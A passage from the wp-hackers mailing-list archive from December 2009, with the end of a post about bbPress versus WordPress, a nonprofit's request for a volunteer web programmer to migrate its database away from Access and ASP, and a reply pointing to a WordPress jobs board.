what its moving towards is a rather specific CMS use which would apply to  
WordPress better i think.

Just my 2c of not wanting to hear issues later down the track with the  
implementations.. But hey, I'm sure someone in their right mind could  
customise bbPress to do anything :)

-- 
Dion Hulse / dd32

Contact:
  e: contact at dd32.id.au
  msn: msn at d32.id.au
  skype: theonly_dd32
Web: http://dd32.id.au/

From chasm at epop3.com  Thu Dec 31 22:17:29 2009
From: chasm at epop3.com (charles meyer)
Date: Thu, 31 Dec 2009 17:17:29 -0500
Subject: [wp-hackers] Web Programmer Needed
Message-ID: <4B3D22F9.6060006@epop3.com>

Hi there,

I hope you all have been able to enjoy your holidays.

I'm not quite about the etiquette for this list so I apologize in 
advance if I inadvertently violate any rules.

The Scriptwriters Network is an all-volunteer, educational tax-exempt 
501(c)(3)  non profit which has been successfully educating and 
providing access to emerging scriptwriters for over 23 years.

We're in need of a volunteer web programmer.

We have an Award Winning Web Site with our Open Source content 
management system (CMS Made Simple) so a web programmer would not be 
required to manage a lot of content. It's programming we need not 
content management.

Our High School Fellowship Program reaches out to under-represented high 
school students by mentoring students in scriptwriting. The program has 
successfully, for over 15 years, educated disadvantaged students 
teaching them both creative writing and real life skills like meeting 
deadlines and accepting and sharing constructive criticism in a 
supportive way.

The Web Programmer position is truly a unique opportunity for a person 
with the requisite skills, a good work ethic
with attention to detail who would like to add an 
entertainment/education Web site to their portfolio and
have real impact in helping us educate and develop opportunities for 
emerging scriptwriters.

We're very interested in migrating our Membership Data Base away from 
Access to my SQL as well as migrating away from ASP. These were aspects 
of the Web site we inherited and did not choose.

I've listed this opportunity with no less than 15 colleges and 
universities throughout California, I've posted
this opportunity on several Linux and Mac groups, spoken with SCORE so 
I'm not sure how else or where else I might consider reaching out to 
those with web programming skills and experience.

I'd very much appreciate your thoughts and suggestions about how and 
where we might try recruiting a web programmer.

Thank you so much,

Charles.

Charles Meyer
Executive Director
The Scriptwriters Network Foundation Inc.
www.scriptwritersnetwork.org






From dan at jallits.com  Thu Dec 31 23:11:44 2009
From: dan at jallits.com (Daniel Craig Jallits)
Date: Thu, 31 Dec 2009 17:11:44 -0600
Subject: [wp-hackers] Web Programmer Needed
In-Reply-To: <4B3D22F9.6060006@epop3.com>
References: <4B3D22F9.6060006@epop3.com>
Message-ID: <7E11D275-3599-4121-BCD4-6539EF9CA4AB@jallits.com>

Welcome to the list Charles!

The appropriate place tp post this is at  http://jobs.wordpress.net

Happy New Years!

